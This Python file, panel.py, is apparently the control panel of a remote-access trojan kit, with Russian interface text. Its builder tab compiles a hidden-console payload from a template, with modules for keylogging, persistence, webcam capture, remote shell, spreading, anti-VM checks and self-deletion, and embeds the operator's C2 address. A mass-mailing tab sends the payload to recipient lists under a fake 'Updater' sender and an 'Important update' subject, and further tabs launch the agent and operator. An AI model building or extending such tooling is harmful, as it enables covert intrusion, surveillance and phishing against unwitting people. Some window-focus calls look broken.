# language: Python, file: panel.py
import os, sys, json, time, socket, struct, base64, subprocess, tempfile, pathlib, shutil
import threading, importlib.util
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext

if getattr(sys, "frozen", False):
    RES = pathlib.Path(sys._MEIPASS)
    BASE = pathlib.Path(sys.executable).parent
else:
    RES = BASE = pathlib.Path(__file__).parent

try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    HAS_KEYBOARD = False

try:
    from PyQt5 import QtWidgets
    HAS_QT = True
except ImportError:
    HAS_QT = False

CFG_PATH = BASE / "mail_config.json"
DEFAULT_CFG = {
    "smtp_host": "smtp.gmail.com", "smtp_port": 587,
    "smtp_user": "", "smtp_pass": "",
    "from_name": "Updater", "subject": "Important update",
    "body": "Please check the attached file.",
    "delay_sec": 3, "attach_file": "",
}

def _load_cfg():
    if CFG_PATH.exists():
        try:
            return {**DEFAULT_CFG, **json.loads(CFG_PATH.read_text(encoding="utf-8"))}
        except Exception:
            pass
    CFG_PATH.write_text(json.dumps(DEFAULT_CFG, ensure_ascii=False, indent=2), encoding="utf-8")
    return dict(DEFAULT_CFG)

def _save_cfg(cfg):
    CFG_PATH.write_text(json.dumps(cfg, ensure_ascii=False, indent=2), encoding="utf-8")

def _python_exe():
    if getattr(sys, "frozen", False):
        for c in ("python", "python3", "py"):
            p = shutil.which(c)
            if p: return p
        return None
    return sys.executable

class BuilderTab(ttk.Frame):
    def __init__(self, master, log_fn, on_cfg_saved):
        super().__init__(master, padding=10)
        self.log = log_fn
        self.on_cfg_saved = on_cfg_saved
        self.cfg = _load_cfg()
        self.vars = {}
        self.mods = {}
        self._ui()

    def _ui(self):
        self.columnconfigure(1, weight=1)
        fields = [
            ("smtp_host", "SMTP host", self.cfg["smtp_host"]),
            ("smtp_port", "SMTP port", str(self.cfg["smtp_port"])),
            ("smtp_user", "Email (от кого)", self.cfg["smtp_user"]),
            ("smtp_pass", "App password", self.cfg["smtp_pass"]),
            ("mail_to",   "C2 mail (куда отчёты)", self.cfg.get("mail_to", "")),
            ("c2_host",   "C2 host (IP оператора)", "127.0.0.1"),
            ("c2_port",   "C2 port (RDP)", "5555"),
        ]
        r = 0
        for k, label, default in fields:
            ttk.Label(self, text=label).grid(row=r, column=0, sticky="w", pady=3)
            v = tk.StringVar(value=default)
            ttk.Entry(self, textvariable=v, show="*" if k == "smtp_pass" else "").grid(row=r, column=1, sticky="ew", pady=3)
            self.vars[k] = v
            r += 1

        ttk.Button(self, text="Сохранить SMTP в mail_config.json", command=self.save_cfg).grid(row=r, column=0, columnspan=2, sticky="ew", pady=(4, 8))
        r += 1

        ttk.Label(self, text="Формат").grid(row=r, column=0, sticky="w")
        self.fmt = tk.StringVar(value="exe")
        ttk.Combobox(self, textvariable=self.fmt, values=["exe", "dll", "bat", "msi"], state="readonly", width=10).grid(row=r, column=1, sticky="w")
        r += 1

        ttk.Label(self, text="Компилятор").grid(row=r, column=0, sticky="w")
        self.comp = tk.StringVar(value="pyinstaller")
        ttk.Combobox(self, textvariable=self.comp, values=["pyinstaller", "nuitka"], state="readonly", width=12).grid(row=r, column=1, sticky="w")
        r += 1

        self.var_safe = tk.BooleanVar(value=True)
        ttk.Checkbutton(self, text="SAFE_MODE (не ломает систему)", variable=self.var_safe).grid(row=r, column=0, columnspan=2, sticky="w", pady=4)
        r += 1

        mods = ttk.LabelFrame(self, text="Модули", padding=6)
        mods.grid(row=r, column=0, columnspan=2, sticky="ew", pady=6)
        all_mods = ["persistence", "keylogger", "screenshot", "shell", "download", "upload", "clipboard", "processes", "webcam", "spread", "antivm", "selfdelete", "rdp"]
        for i, m in enumerate(all_mods):
            v = tk.BooleanVar(value=(m not in ("spread", "selfdelete")))
            ttk.Checkbutton(mods, text=m, variable=v).grid(row=i // 3, column=i % 3, sticky="w")
            self.mods[m] = v
        r += 1

        ttk.Button(self, text="Собрать payload", command=self.build).grid(row=r, column=0, columnspan=2, pady=10, sticky="ew")

    def save_cfg(self):
        cfg = _load_cfg()
        for k in ("smtp_host", "smtp_port", "smtp_user", "smtp_pass"):
            cfg[k] = self.vars[k].get()
        try: cfg["smtp_port"] = int(cfg["smtp_port"])
        except ValueError: cfg["smtp_port"] = 587
        _save_cfg(cfg)
        self.on_cfg_saved(cfg)
        self.log("[cfg] SMTP сохранён в mail_config.json")

    def build(self):
        cfg = {k: v.get() for k, v in self.vars.items()}
        cfg["safe_mode"] = self.var_safe.get()
        cfg["modules"] = [k for k, v in self.mods.items() if v.get()]
        try:
            cfg["smtp_port"] = int(cfg["smtp_port"])
            cfg["c2_port"] = int(cfg["c2_port"])
        except ValueError:
            messagebox.showerror("Ошибка", "Порты должны быть числами.")
            return
        if not cfg["smtp_user"] or not cfg["smtp_pass"] or not cfg["mail_to"]:
            messagebox.showerror("Ошибка", "Заполни Email, App password и C2 mail.")
            return
        template = RES / "rat_template.py"
        if not template.exists():
            messagebox.showerror("Ошибка", f"rat_template.py не найден рядом с panel.\n{RES}")
            return
        py = _python_exe()
        if not py:
            messagebox.showerror("Ошибка", "Python не найден в системе. Установи Python 3.11.")
            return

        work = pathlib.Path(tempfile.mkdtemp(prefix="ratbuild_"))
        src = work / "rat_build.py"
        src.write_text(template.read_text(encoding="utf-8").replace("__CFG__", json.dumps(cfg, ensure_ascii=False)), encoding="utf-8")
        lib = RES / "rdp_agent_lib.py"
        if lib.exists(): shutil.copy(lib, work / "rdp_agent_lib.py")

        out_dir = pathlib.Path(filedialog.askdirectory(title="Куда сохранить"))
        if not out_dir: return
        self.log(f"[build] fmt={self.fmt.get()} comp={self.comp.get()} safe={cfg['safe_mode']} rdp={('rdp' in cfg['modules'])}")
        threading.Thread(target=self._compile, args=(src, work, self.fmt.get(), self.comp.get(), out_dir, py), daemon=True).start()

    def _compile(self, src, work, fmt, comp, out_dir, py):
        try:
            flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
            if fmt == "bat":
                out = out_dir / "payload.bat"
                out.write_text(f'@echo off\r\nstart "" /b "{py}" "{src}"\r\n', encoding="utf-8")
            elif comp == "nuitka":
                subprocess.run([py, "-m", "nuitka", "--onefile", "--windows-disable-console", "--assume-yes-for-downloads", f"--output-dir={out_dir}", "--output-filename=payload.exe", str(src)], cwd=work, check=True, capture_output=True, creationflags=flags)
                out = out_dir / "payload.exe"
            else:
                subprocess.run([py, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "payload", "--distpath", str(out_dir), str(src)], cwd=work, check=True, capture_output=True, creationflags=flags)
                out = out_dir / "payload.exe"
            self._validate(out, fmt)
        except subprocess.CalledProcessError as e:
            err = (e.stderr or b"").decode(errors="ignore")[-500:]
            self.log(f"[build] FAIL: {err}")
        except Exception as e:
            self.log(f"[build] FAIL: {e}")

    def _validate(self, path, fmt):
        try:
            with open(path, "rb") as f: head = f.read(8)
            if fmt in ("exe", "dll"): ok = head.startswith(b"MZ")
            elif fmt == "msi": ok = head.startswith(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1")
            elif fmt == "bat":
                txt = open(path, "r", errors="ignore").read(4096).lower()
                ok = any(txt.lstrip().startswith(p) for p in ("@echo", "::", "rem ", "echo "))
            else: ok = False
        except Exception: ok = False
        
        if not ok:
            try: os.remove(path)
            except OSError: pass
            self.log("[build] неверное расширение")
            self.after(0, messagebox.showerror, "Ошибка", "Неверное расширение. Измените на другое!")
            return
        self.log(f"[build] OK: {path}")
        self.after(0, messagebox.showinfo, "Готово", f"Файл: {path}")

class MassMailTab(ttk.Frame):
    def __init__(self, master, log_fn):
        super().__init__(master, padding=10)
        self.log_external = log_fn
        self.cfg = _load_cfg()
        self._stop = threading.Event()
        self._ui()
        self.refresh_cfg()

    def _ui(self):
        self.columnconfigure(1, weight=1)
        ttk.Label(self, text="От кого (SMTP)").grid(row=0, column=0, sticky="w")
        self.smtp_label = ttk.Label(self, text="")
        self.smtp_label.grid(row=0, column=1, columnspan=2, sticky="w")

        ttk.Label(self, text="КУДА слать — получатели (по одному на строку)", font=("", 10, "bold")).grid(row=1, column=0, columnspan=3, sticky="w", pady=(10, 2))
        self.txt_to = tk.Text(self, height=7)
        self.txt_to.grid(row=2, column=0, columnspan=3, sticky="ew")

        ttk.Label(self, text="Тема").grid(row=3, column=0, sticky="w", pady=3)
        self.var_subj = tk.StringVar(value=self.cfg.get("subject", ""))
        ttk.Entry(self, textvariable=self.var_subj).grid(row=3, column=1, columnspan=2, sticky="ew")

        ttk.Label(self, text="Текст").grid(row=4, column=0, sticky="nw")
        self.txt_body = tk.Text(self, height=4)
        self.txt_body.insert("1.0", self.cfg.get("body", ""))
        self.txt_body.grid(row=4, column=0, columnspan=3, sticky="ew")

        ttk.Label(self, text="Вложение").grid(row=5, column=0, sticky="w", pady=3)
        self.var_att = tk.StringVar(value=self.cfg.get("attach_file", ""))
        ttk.Entry(self, textvariable=self.var_att).grid(row=5, column=1, sticky="ew")
        ttk.Button(self, text="...", width=3, command=self._pick).grid(row=5, column=2)

        ttk.Label(self, text="Задержка, сек").grid(row=6, column=0, sticky="w")
        self.var_delay = tk.DoubleVar(value=self.cfg.get("delay_sec", 3))
        ttk.Spinbox(self, from_=1, to=60, textvariable=self.var_delay, width=6).grid(row=6, column=1, sticky="w")

        btns = ttk.Frame(self)
        btns.grid(row=7, column=0, columnspan=3, sticky="ew", pady=8)
        btns.columnconfigure(0, weight=1); btns.columnconfigure(1, weight=1)
        self.btn_send = ttk.Button(btns, text="Начать рассылку", command=self.start)
        self.btn_send.grid(row=0, column=0, sticky="ew", padx=4)
        self.btn_stop = ttk.Button(btns, text="Стоп", command=self.stop, state="disabled")
        self.btn_stop.grid(row=0, column=1, sticky="ew", padx=4)

        self.progress = ttk.Progressbar(self, mode="determinate")
        self.progress.grid(row=8, column=0, columnspan=3, sticky="ew")

        ttk.Label(self, text="Лог").grid(row=9, column=0, sticky="w", pady=(8, 0))
        self.txt_log = scrolledtext.ScrolledText(self, height=8, state="disabled")
        self.txt_log.grid(row=10, column=0, columnspan=3, sticky="nsew")
        self.rowconfigure(10, weight=1)

    def refresh_cfg(self):
        self.cfg = _load_cfg()
        self.smtp_label.configure(text=f"{self.cfg['smtp_host']}:{self.cfg['smtp_port']}  ({self.cfg['smtp_user'] or 'не настроено — заполни Builder'})")
        if not self.var_subj.get(): self.var_subj.set(self.cfg.get("subject", ""))
        if not self.var_att.get(): self.var_att.set(self.cfg.get("attach_file", ""))

    def _log(self, line):
        self.txt_log.configure(state="normal")
        self.txt_log.insert("end", line + "\n")
        self.txt_log.see("end")
        self.txt_log.configure(state="disabled")
        self.log_external(line)

    def _pick(self):
        p = filedialog.askopenfilename()
        if p: self.var_att.set(p)

    @staticmethod
    def _parse(raw):
        import re
        emails = re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", raw)
        seen, out = set(), []
        for e in emails:
            k = e.lower()
            if k not in seen:
                seen.add(k); out.append(e)
        return out

    def start(self):
        self.refresh_cfg()
        if not self.cfg["smtp_user"] or not self.cfg["smtp_pass"]:
            messagebox.showerror("Ошибка", "SMTP не настроен. Вкладка Builder → заполни и сохрани.")
            return
        rcpts = self._parse(self.txt_to.get("1.0", "end"))
        if not rcpts:
            messagebox.showerror("Ошибка", "Поле «Получатели» пустое или нет валидных адресов.")
            return
        att = self.var_att.get().strip()
        if att and not os.path.isfile(att):
            messagebox.showerror("Ошибка", "Файл вложения не найден.")
            return
        if not messagebox.askyesno("Подтверждение", f"От: {self.cfg['smtp_user']}\nКуда ({len(rcpts)}):\n" + "\n".join(rcpts[:10]) + ("\n..." if len(rcpts) > 10 else "") + "\n\nОтправить?"):
            return
        self._stop.clear()
        self.btn_send.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.progress.configure(maximum=len(rcpts), value=0)
        threading.Thread(target=self._run, args=(rcpts, self.var_subj.get(), self.txt_body.get("1.0", "end"), att, float(self.var_delay.get())), daemon=True).start()

    def stop(self):
        self._stop.set()
        self._log("[!] остановка")

    def _run(self, rcpts, subject, body, att, delay):
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.mime.application import MIMEApplication
        from email.policy import default as email_policy
        ok = fail = 0
        att_name = att_data = None
        if att:
            att_name = os.path.basename(att)
            with open(att, "rb") as f: att_data = f.read()
        try:
            s = smtplib.SMTP(self.cfg["smtp_host"], int(self.cfg["smtp_port"]), timeout=30)
            s.ehlo(); s.starttls(); s.ehlo()
            s.login(self.cfg["smtp_user"], self.cfg["smtp_pass"])
        except smtplib.SMTPAuthenticationError:
            self._log("[!] auth error: app password? 2FA включена?")
            self.after(0, self._done); return
        except Exception as e:
            self._log(f"[!] smtp: {e}")
            self.after(0, self._done); return
        try:
            for i, r in enumerate(rcpts, 1):
                if self._stop.is_set(): break
                m = MIMEMultipart(policy=email_policy)
                m["From"] = f"{self.cfg.get('from_name','Updater')} <{self.cfg['smtp_user']}>"
                m["To"] = r
                m["Subject"] = subject
                m.attach(MIMEText(body, "plain", "utf-8"))
                if att_data:
                    p = MIMEApplication(att_data)
                    p.add_header("Content-Disposition", "attachment", filename=att_name)
                    m.attach(p)
                try:
                    s.send_message(m); ok += 1
                    self.after(0, self._log, f"[{i}/{len(rcpts)}] -> {r}  ok")
                except Exception as e:
                    fail += 1
                    self.after(0, self._log, f"[{i}/{len(rcpts)}] -> {r}  FAIL: {e}")
                self.after(0, self.progress.configure, {"value": i})
                time.sleep(max(1.0, delay))
        finally:
            try: s.quit()
            except Exception: pass
            self._log(f"[i] ok={ok} fail={fail}")
            self.after(0, self._done)

    def _done(self):
        self.btn_send.configure(state="normal")
        self.btn_stop.configure(state="disabled")

class AgentTab(ttk.Frame):
    def __init__(self, master, log_fn):
        super().__init__(master, padding=10)
        self.log = log_fn
        self._proc = None
        self.columnconfigure(1, weight=1)

        ttk.Label(self, text="Host (IP оператора)").grid(row=0, column=0, sticky="w", pady=3)
        self.var_host = tk.StringVar(value="127.0.0.1")
        ttk.Entry(self, textvariable=self.var_host).grid(row=0, column=1, sticky="ew")

        ttk.Label(self, text="Port").grid(row=1, column=0, sticky="w")
        self.var_port = tk.StringVar(value="5555")
        ttk.Entry(self, textvariable=self.var_port, width=10).grid(row=1, column=1, sticky="w")

        self.var_safe = tk.BooleanVar(value=True)
        ttk.Checkbutton(self, text="RAT_SAFE (не подключаться)", variable=self.var_safe).grid(row=2, column=0, columnspan=2, sticky="w", pady=6)

        btns = ttk.Frame(self)
        btns.grid(row=3, column=0, columnspan=2, sticky="ew")
        self.btn_start = ttk.Button(btns, text="Запустить агент", command=self.start)
        self.btn_start.grid(row=0, column=0, padx=4, sticky="w")
        self.btn_stop = ttk.Button(btns, text="Стоп", command=self.stop, state="disabled")
        self.btn_stop.grid(row=0, column=1, padx=4, sticky="w")

        self.out = scrolledtext.ScrolledText(self, height=14, state="disabled")
        self.out.grid(row=4, column=0, columnspan=2, sticky="nsew", pady=(8, 0))
        self.rowconfigure(4, weight=1)

    def _log(self, s):
        self.out.configure(state="normal")
        self.out.insert("end", s + "\n")
        self.out.see("end")
        self.out.configure(state="disabled")
        self.log(s)

    def start(self):
        if self._proc and self._proc.poll() is None: return
        py = _python_exe()
        agent = RES / "rdp_agent.py"
        if not py or not agent.exists():
            self._log("[agent] python или rdp_agent.py не найдены")
            return
        env = os.environ.copy()
        env["RAT_HOST"] = self.var_host.get()
        env["RAT_PORT"] = self.var_port.get()
        env["RAT_SAFE"] = "1" if self.var_safe.get() else "0"
        try:
            self._proc = subprocess.Popen([py, str(agent)], env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0)
        except Exception as e:
            self._log(f"[agent] start fail: {e}")
            return
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        threading.Thread(target=self._read, daemon=True).start()
        self._log(f"[agent] safe={env['RAT_SAFE']} {env['RAT_HOST']}:{env['RAT_PORT']}")

    def _read(self):
        for line in self._proc.stdout: self.after(0, self._log, line.rstrip())
        self.after(0, self._exited)

    def _exited(self):
        self._log("[agent] завершён")
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")

    def stop(self):
        if self._proc and self._proc.poll() is None:
            self._proc.terminate()
            self._log("[agent] terminated")

class OperatorTab(ttk.Frame):
    def __init__(self, master, log_fn):
        super().__init__(master, padding=10)
        self.log = log_fn
        self.thread = None
        self.columnconfigure(0, weight=1); self.rowconfigure(3, weight=1)

        ttk.Label(self, text="RDP-оператор открывается в отдельном окне (PyQt5).").grid(row=0, column=0, sticky="w")
        ttk.Label(self, text="Ctrl+Insert — поднять панель и переключить сюда.").grid(row=1, column=0, sticky="w", pady=(0, 8))
        self.btn_run = ttk.Button(self, text="Запустить оператор", command=self.launch)
        self.btn_run.grid(row=2, column=0, sticky="nw")
        self.out = scrolledtext.ScrolledText(self, height=10, state="disabled")
        self.out.grid(row=3, column=0, sticky="nsew", pady=(8, 0))
        self.rowconfigure(3, weight=1)

    def _log(self, s):
        self.out.configure(state="normal"); self.out.insert("end", s + "\n"); self.out.see("end"); self.out.configure(state="disabled"); self.log(s)

    def launch(self):
        if not HAS_QT:
            self._log("[operator] PyQt5 не установлен: pip install pyqt5"); return
        if self.thread and self.thread.is_alive():
            self._log("[operator] уже запущен"); return
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        self._log("[operator] запуск на :5555")

    def _run(self):
        try:
            app = QtWidgets.QApplication.instance() or QtWidgets.QApplication(sys.argv)
            spec = importlib.util.spec_from_file_location("rdp_operator", RES / "rdp_operator.py")
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            w = mod.Operator()
            w.show()
            app.exec_()
        except Exception as e:
            self._log(f"[operator] fail: {e}")

class Panel(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("RAT Control Panel")
        self.geometry("1000x760")
        self._build()
        self._bind_hotkeys()

    def _build(self):
        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=8, pady=8)
        self.nb = nb
        self.tab_builder = BuilderTab(nb, self.log, self._on_cfg_saved)
        self.tab_mail = MassMailTab(nb, self.log)
        self.tab_agent = AgentTab(nb, self.log)
        self.tab_op = OperatorTab(nb, self.log)
        nb.add(self.tab_builder, text="Builder")
        nb.add(self.tab_mail, text="Рассылка")
        nb.add(self.tab_agent, text="Agent")
        nb.add(self.tab_op, text="Operator")

        log_frame = ttk.LabelFrame(self, text="Общий лог", padding=4)
        log_frame.pack(fill="both", expand=False, padx=8, pady=(0, 8))
        self.common_log = scrolledtext.ScrolledText(log_frame, height=6, state="disabled")
        self.common_log.pack(fill="both", expand=True)

    def log(self, line):
        self.common_log.configure(state="normal")
        self.common_log.insert("end", f"{time.strftime('%H:%M:%S')} {line}\n")
        self.common_log.see("end")
        self.common_log.configure(state="disabled")

    def _on_cfg_saved(self, cfg):
        self.tab_mail.refresh_cfg()
        self.log("[cfg] рассылка обновлена SMTP")

    def _bind_hotkeys(self):
        if not HAS_KEYBOARD:
            self.log("[hotkeys] keyboard не установлен"); return
        try:
            keyboard.add_hotkey("alt+insert", self._focus_mail)
            keyboard.add_hotkey("ctrl+insert", self._focus_operator)
            self.log("[hotkeys] alt+insert=рассылка, ctrl+insert=оператор")
        except Exception as e:
            self.log(f"[hotkeys] fail: {e}")

    def _focus_mail(self): self.after(0, self._do_focus_mail)
    def _do_focus_mail(self):
        self.deiconify(); self.showNormal(); self.raise_(); self.activateWindow(); self.nb.select(self.tab_mail)
    def _focus_operator(self): self.after(0, self._do_focus_op)
    def _do_focus_op(self):
        self.deiconify(); self.showNormal(); self.raise_(); self.activateWindow(); self.nb.select(self.tab_op)

if __name__ == "__main__":
    Panel().mainloop()
